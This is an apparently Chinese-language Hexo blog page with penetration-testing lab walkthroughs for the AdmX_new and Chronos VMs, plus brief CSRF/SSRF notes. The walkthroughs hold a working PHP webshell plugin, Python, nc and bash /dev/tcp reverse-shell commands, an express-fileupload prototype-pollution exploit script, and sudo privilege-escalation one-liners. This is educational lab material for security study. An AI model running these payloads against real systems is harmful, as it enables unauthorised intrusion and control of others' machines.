<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/plugin/bganimation/bg.css">

  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
    <h2 class="author">John Doe</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main">
  
    <article id="post-靶机/45-靶机AdmX_new/45-靶机AdmX_new" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/02/28/%E9%9D%B6%E6%9C%BA/45-%E9%9D%B6%E6%9C%BAAdmX_new/45-%E9%9D%B6%E6%9C%BAAdmX_new/" class="article-date">
  <time class="post-time" datetime="2024-02-28T08:02:46.000Z" itemprop="datePublished">
    <span class="post-month">2月</span><br/>
    <span class="post-day">28</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/02/28/%E9%9D%B6%E6%9C%BA/45-%E9%9D%B6%E6%9C%BAAdmX_new/45-%E9%9D%B6%E6%9C%BAAdmX_new/">45.靶机AdmX_new</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>靶机AdmX_new</p>
<p>信息收集</p>
<p>进行主机的发现，由于已知主机跟Kali在同一NAT模式网段下 ,所以使用 arp-scan 工具扫描ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth1</span><br></pre></td></tr></table></figure>

<p><img src="/45-BJ.assets/image-20240228095238117.png" alt="image-20240228095238117"></p>
<p>使用nmap进行端口扫描，第一步是对目标进行端口的发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.137.130</span><br></pre></td></tr></table></figure>

<p>发现靶机上只开了80端口</p>
<p><img src="/45-BJ.assets/image-20240228095756503.png" alt="image-20240228095756503"></p>
<p>访问192.168.137.130</p>
<p><img src="/45-BJ.assets/image-20240228095836462.png" alt="image-20240228095836462"></p>
<p>出现Apache2 Ubuntu Default Page</p>
<p>可能存在Web 前端部署在 Ubuntu 上</p>
<p>扫描下目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.137.130&quot; -x 403,404</span><br></pre></td></tr></table></figure>

<p><img src="/45-BJ.assets/image-20240228104137253.png" alt="image-20240228104137253"></p>
<p>发现有wordpress访问与wp-login.php登录页面</p>
<p>访问192.168.137.130&#x2F;wordpress</p>
<p><img src="/45-BJ.assets/image-20240228104331025.png" alt="image-20240228104331025"></p>
<p>页面加载不完全</p>
<p><img src="/45-BJ.assets/image-20240228104520172.png" alt="image-20240228104520172"></p>
<p>三个js加载错误</p>
<p>该页面经过长时间的加载始终无法完成，所以需要通过Burp抓包分析网站加载过程</p>
<p>burpsuite抓包</p>
<p><img src="/45-BJ.assets/image-20240228104824916.png" alt="image-20240228104824916"></p>
<p>通过Burp抓包分析发现，该站点加载过程中会向<code>192.168.159.145</code>申请加载JS资源，故造成站点加载速度慢</p>
<p>请求ip不对在Burp做设置替换规则</p>
<p>响应头部和响应体中替换规则192.168.159.145为192.168.137.130</p>
<p><img src="/45-BJ.assets/image-20240228142259320.png" alt="image-20240228142259320"></p>
<p>刷新后页面加载正常</p>
<p><img src="/45-BJ.assets/image-20240228142356999.png" alt="image-20240228142356999"></p>
<p>在前台页面并没发现更多的漏洞，但是有告诉我们一个admin的名称</p>
<p>尝试用admin登陆下wp-login.php的WordPress后台管理地址</p>
<p>访问192.168.137.130&#x2F;wordpress&#x2F;wp-login.php</p>
<p><img src="/45-BJ.assets/image-20240228142520681.png" alt="image-20240228142520681"></p>
<p>经测试，该登录入口不存在SQL注入（万能密码）漏洞，故采用暴力破解</p>
<p>测试用户是否存在</p>
<p>输入正确的用户名时：提示密码错误</p>
<p>输入不存在的用户名时：提示用户名不知道</p>
<p>开始密码爆破</p>
<p>使用Burp截获提交登录密码的包</p>
<p><img src="/45-BJ.assets/image-20240228142726003.png" alt="image-20240228142726003"></p>
<p>添加字典尝试密码爆破</p>
<p>发送到Intruder，只对密码进行破解</p>
<p><img src="/45-BJ.assets/image-20240228143010860.png" alt="image-20240228143010860"></p>
<p>设置Payload，加载<code>MidPwds.txt</code>密码字典</p>
<p><img src="/45-BJ.assets/image-20240228143029581.png" alt="image-20240228143029581"></p>
<p>经测试，密码为adam14</p>
<p>登录管理员账户，查看后台管理页面，查看WordPress版本为5.7.1，主题为Twenty Twenty-One</p>
<p>WordPress系统GetShell（3种方法）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1- Media-&gt;Add New-&gt;上传Shell</span><br><span class="line"></span><br><span class="line">2- Appearance-&gt;Edit Themes-&gt;404Template-&gt;直接写入一句话木马eavl($_POST[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line">3- Plugins-&gt;Add New-&gt;Upload Plugin-&gt;上传一个自己手写的插件</span><br></pre></td></tr></table></figure>

<p>  使用上传手写插件</p>
<p>创建文件shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cat shell.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Plugin Name: Webshell</span><br><span class="line"> * Plugin URI: https://qzc.github.io</span><br><span class="line"> * Description: WP Wehshell for Pentest</span><br><span class="line"> * Version: 1.0</span><br><span class="line"> * Author: qzc</span><br><span class="line"> * Author URI: https://qzc.github.io</span><br><span class="line"> * License: https://qzc.github.io</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;]))</span><br><span class="line">        &#123;</span><br><span class="line">                system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>压缩</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip shell.zip shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/45-BJ.assets/image-20240228144936605.png" alt="image-20240228144936605"></p>
<p>上传</p>
<p><img src="/45-BJ.assets/image-20240228150537837.png" alt="image-20240228150537837"></p>
<p>激活访问一下上传的shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.130/wordpress/wp-content/plugins/shell.php?cmd=id</span><br></pre></td></tr></table></figure>

<p><img src="/45-BJ.assets/image-20240228151004588.png" alt="image-20240228151004588"></p>
<p>已经实现系统命令执行</p>
<p>开始反弹Shell</p>
<p>kali主机监听5555端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 5555</span><br></pre></td></tr></table></figure>

<p>测试靶机上是否存在nc、python3</p>
<p><img src="/45-BJ.assets/image-20240228151228870.png" alt="image-20240228151228870"></p>
<p><img src="/45-BJ.assets/image-20240228151251511.png" alt="image-20240228151251511"></p>
<p>存在nc与python3</p>
<p>反弹成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.130/wordpress/wp-content/plugins/shell.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.137.128%22,5555));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27</span><br></pre></td></tr></table></figure>

<p><img src="/45-BJ.assets/image-20240228151701784.png" alt="image-20240228151701784"></p>
<p>用Python3反弹Shell</p>
<p>在404模板页面写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd wp-content/themes/twentytwentyone</span><br><span class="line">vi 404.php</span><br></pre></td></tr></table></figure>

<p><img src="/45-BJ.assets/image-20240228151904979.png" alt="image-20240228151904979"></p>
<p>功能有缺陷，vi编辑器无法显示</p>
<p>升级Shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; </span><br><span class="line">ctrl +z </span><br><span class="line">stty raw -echo;fg;reset </span><br></pre></td></tr></table></figure>

<p>可以正常使用</p>
<p>编辑404.php，加入一句话木马</p>
<p><img src="/45-BJ.assets/image-20240228154614982.png" alt="image-20240228154614982"></p>
<p>使用蚁剑连接Shell</p>
<p>连接地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.130/wordpress/wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure>

<p><img src="/45-BJ.assets/image-20240228155017188.png" alt="image-20240228155017188"></p>
<p>连接成功</p>
<p>关于Shell的建议</p>
<p>Tip：一般系统的Shell都较难获取，一但获取某个Shell权限后，建议多种方式，多挣途径，多准备几个Shell，以防Shell权限丢失</p>
<p>系统提权</p>
<p>前期通过系统信息收集该系统存在wpadmin账户，内核版本5.4无法提权</p>
<p>通过WordPress配置文件找到了数据库配置文件，找到数据库连接密码</p>
<p><img src="/45-BJ.assets/image-20240228155137455.png" alt="image-20240228155137455"></p>
<p>连接数据库用户名<code>admin</code>、密码：<code>Wp_Admin#123</code></p>
<p>尝试切换wpadmin，并使用adam14密码登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su wpadmin</span><br><span class="line">密码adam14</span><br></pre></td></tr></table></figure>

<p><img src="/45-BJ.assets/image-20240228155448103.png" alt="image-20240228155448103"></p>
<p>在wpadmin获取第一个flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cat local.txt</span><br></pre></td></tr></table></figure>

<p>查询用户权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>该用户不需要密码 sudo mysql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>

<p>输入密码adam14</p>
<p><img src="/45-BJ.assets/image-20240228155628760.png" alt="image-20240228155628760"></p>
<p>成功登录数据库</p>
<p>Mysql提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system /bin/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cat proot.txt</span><br></pre></td></tr></table></figure>

<p><img src="/45-BJ.assets/image-20240228155759448.png" alt="image-20240228155759448"></p>
<p>完成</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/28/%E9%9D%B6%E6%9C%BA/45-%E9%9D%B6%E6%9C%BAAdmX_new/45-%E9%9D%B6%E6%9C%BAAdmX_new/" data-id="cltmognaw00069wu4herhfafe" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-靶机/44-靶机chronos.assets/44-靶机chronos" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/02/27/%E9%9D%B6%E6%9C%BA/44-%E9%9D%B6%E6%9C%BAchronos.assets/44-%E9%9D%B6%E6%9C%BAchronos/" class="article-date">
  <time class="post-time" datetime="2024-02-27T12:42:55.000Z" itemprop="datePublished">
    <span class="post-month">2月</span><br/>
    <span class="post-day">27</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/02/27/%E9%9D%B6%E6%9C%BA/44-%E9%9D%B6%E6%9C%BAchronos.assets/44-%E9%9D%B6%E6%9C%BAchronos/">44.靶机chronos</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>靶机chronos</p>
<p>信息收集</p>
<p>进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>

<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204432829.png" alt="image-20240227204432829"></p>
<p>使用nmap进行端口扫描，第一步是对目标进行端口的发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.101</span><br></pre></td></tr></table></figure>

<p>发现靶机上开了3个端口</p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204632520.png" alt="image-20240227204632520"></p>
<p>识别靶机端口开放的服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,8000,80 -sV 192.168.56.101 </span><br></pre></td></tr></table></figure>

<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204726647.png" alt="image-20240227204726647"></p>
<p>访问192.168.56.101 </p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204836245.png" alt="image-20240227204836245"></p>
<p>没有东西</p>
<p>查看页面源代码</p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205007063.png" alt="image-20240227205007063"></p>
<p>发现一个url</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>

<p>结合端口扫描获取信息（目标靶机开启8000端口），通过对以上URL的分析，<code>chronos.local</code>很有可能就是目标靶机本身，并通过data?format&#x3D;获取了系列资源</p>
<p>kali本地hosts绑定chronos.local域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br><span class="line">a模式插入</span><br><span class="line">192.168.56.101 chronos.local</span><br></pre></td></tr></table></figure>

<p>再次刷新192.168.56.101 ，页面发生变化</p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205306561.png" alt="image-20240227205306561"></p>
<p>发现时间是变化的</p>
<p>怀疑是命令执行，对获取系统时间有直接作用</p>
<p>用Burp记录网站加载过程进行抓包</p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205540583.png" alt="image-20240227205540583"></p>
<p>通过Burp-Repeater测试GET参数</p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227211758273.png" alt="image-20240227211758273"></p>
<p>错误信息中显示了是base58编码</p>
<p>研究下4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL </p>
<p>使用CyberChef工具由Base58解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CyberChef工具地址https://icyberchef.com/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure>

<p>结合网页收集的信息，该参数和date输出参数很相似</p>
<p>有理由猜测该Web应用程序执行的是操作系统指令</p>
<p>尝试注入</p>
<p>Linux系统命令拼接符号：|、；、&amp;</p>
<p>A||B表示：A执行失败，执行B</p>
<p>A&amp;&amp;B表示：A执行成功，执行B</p>
<p>如果在系统执行命令下后拼接ls命令&amp;&amp;ls，那么系统应该应该列出当前目录中的文件</p>
<p>base58(&amp;&amp;ls)&#x3D;yZSGA </p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212143452.png" alt="image-20240227212143452"></p>
<p>查询是否存在nc</p>
<p>base58(&amp;&amp;ls &#x2F;bin)&#x3D;VAZYW9RHPu6D</p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212243578.png" alt="image-20240227212243578"></p>
<p>在右边结果中发现有nc</p>
<p>测试nc功能是否正常</p>
<p>base58(&amp;&amp;nc 192.168.56.102 5555)&#x3D;4UiiY6bkrF7pai4b23hZFghvcmyKsBStt</p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212835573.png" alt="image-20240227212835573"></p>
<p>可以建立连接</p>
<p>使用nc串联方法反弹连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base58(&amp;&amp;nc 192.168.56.102 5555 | /bin/bash | nc 192.168.56.102 6666)=Wqif9Y5HMzQyibWE2TNtxFv2gSUAxAWHVyd7AZxbL2cpEXzRor13WdyY1nfFTeS65EBMdTTrqbfqjcqEhvm</span><br></pre></td></tr></table></figure>

<p>反弹成功</p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227213216647.png" alt="image-20240227213216647"></p>
<p>系统信息收集<br>查看系统账号，发现存在imera账户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">id</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227214611219.png" alt="image-20240227214611219"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/imera</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>

<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227214715730.png" alt="image-20240227214715730"></p>
<p>尝试三种常用的提权方法都无法使用：1、内核漏洞；2、suid提权；3、sudo配置错误</p>
<p>代码审计</p>
<ol>
<li>查看网站根的package.json源码，依赖的组件</li>
<li>再次查看app.js源码，且有相关命令的检测，但没有过滤，确认存在命令执行漏洞，没有找到更多的提权信息</li>
<li>返回上级目录发现了chronos-v2目录，进入chronos-v2&#x2F;backend目录，发现package.json和server.js文件</li>
<li>通过对&#x2F;opt&#x2F;chronos-v2&#x2F;backend&#x2F;server.js文件进行审计，发现靶机在127.0.0.1:8080监听的有一个应用</li>
<li>通过对&#x2F;opt&#x2F;chronos-v2&#x2F;backend&#x2F;package.json文件进行审计，发现fileupload({ parseNested: true }以及”express-fileupload”: “^1.1.7-alpha.3”</li>
<li>通过多方搜索，发现靶机express-fileupload版本存在提权漏洞</li>
</ol>
<p>进行系统用户提权</p>
<ul>
<li>Kali主机创建py脚本vi python</li>
<li>参照<a target="_blank" rel="noopener" href="https://blog.p6.is/Real-World-JS-1/%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC">https://blog.p6.is/Real-World-JS-1/写入攻击脚本</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">cmd = &#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.56.102/7777 0&gt;&amp;1&quot;&#x27;</span><br><span class="line"></span><br><span class="line"># pollute</span><br><span class="line">requests.post(&#x27;http://127.0.0.1:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (</span><br><span class="line">    None, f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)</span><br><span class="line"></span><br><span class="line"># execute command</span><br><span class="line">requests.get(&#x27;http://127.0.0.1:8080&#x27;)</span><br></pre></td></tr></table></figure>

<p>启动http server，将<code>exp.py</code>写入靶机</p>
<p>Kali主机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>靶机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget -c http://192.168.56.102/exp.py</span><br></pre></td></tr></table></figure>

<p>启动监听端口，执行exp.py反弹Shell</p>
<p>Kali</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 7777</span><br></pre></td></tr></table></figure>

<p>靶机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure>

<p>Shell反弹成功，imera用户</p>
<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227220454069.png" alt="image-20240227220454069"></p>
<p>获取用户Flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>

<p>Root用户提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>sudo node提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;, &#123;stdio:[0,1,2]&#125;)&#x27;</span><br></pre></td></tr></table></figure>

<p>获取root用户Flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/27/%E9%9D%B6%E6%9C%BA/44-%E9%9D%B6%E6%9C%BAchronos.assets/44-%E9%9D%B6%E6%9C%BAchronos/" data-id="cltmognax00089wu438qyb35c" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-CSRF和SSRF" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/02/20/CSRF%E5%92%8CSSRF/" class="article-date">
  <time class="post-time" datetime="2024-02-20T11:32:23.000Z" itemprop="datePublished">
    <span class="post-month">2月</span><br/>
    <span class="post-day">20</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/02/20/CSRF%E5%92%8CSSRF/">CSRF和SSRF</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h3><p>CSRF 危害： ●修改个人信息&#x2F;帐号密码 ●发送伪造的业务请求 ●关注他人的社交帐号,推送博文 ●在用户非自愿,不知情的情况下提交请求 ●获取信用卡等信息 </p>
<p>触发条件： ①用户某一网站处于登陆状态（即身份验证状态暂未过期） ②用户访问了一黑客精心构造的带有特殊url访问请求的网站 ③服务器无二次身份验证机制 </p>
<p>漏洞核心： 服务器对用户身份验证不够严格（即缺少二次验证（二次验证加入验证码）或者特殊的身份验证（token）） </p>
<p>漏洞验证： 一般在用户信息更新页面，利用Burpsuite抓包，利用工具内部的功能生成CSRF的POC（这个POC也可以自定义），然后将生成的HTML代码放在一公网服务器下，由用户访问然后查看确认最后是否触发漏洞。 防御方法： 1设置随机Token。如果设置这个参数就不存在漏洞，一般在数据包中就可以直接判断出。（推荐这个） 2检测referer来源。但是一般可伪造。<br>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82918141">DVWA之CSRF(跨站请求伪造攻击)</a> | [CSRF(跨站请求伪造)](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82820115#%EF%BC%881%EF%BC%89%E9%AA%8C%E8%AF%81">https://blog.csdn.net/qq_36119192/article/details/82820115#（1）验证</a> HTTP Referer 字段     ) | <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/118352.html">新手指南：DVWA-1.9全级别教程之CSRF</a></p>
<h3 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF(服务器端请求伪造)"></a>SSRF(服务器端请求伪造)</h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/20/CSRF%E5%92%8CSSRF/" data-id="cltmognas00029wu41h9j7ert" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-title = switch and body = elec" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/02/06/title%20=%20switch%20and%20body%20=%20elec/" class="article-date">
  <time class="post-time" datetime="2024-02-06T10:00:28.933Z" itemprop="datePublished">
    <span class="post-month">2月</span><br/>
    <span class="post-day">06</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title &#x3D; “switch” and body &#x3D; “elec” </p>
<p>router</p>
<p>csrf  服务端过度相信客户端</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/06/title%20=%20switch%20and%20body%20=%20elec/" data-id="cltmognar00019wu4gqpy5ylx" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-弱密码" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/31/%E5%BC%B1%E5%AF%86%E7%A0%81/" class="article-date">
  <time class="post-time" datetime="2024-01-31T01:11:00.079Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">31</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>web-static</p>
<p><a target="_blank" rel="noopener" href="http://79.52.187.38/web/index.html">http://79.52.187.38/web/index.html</a></p>
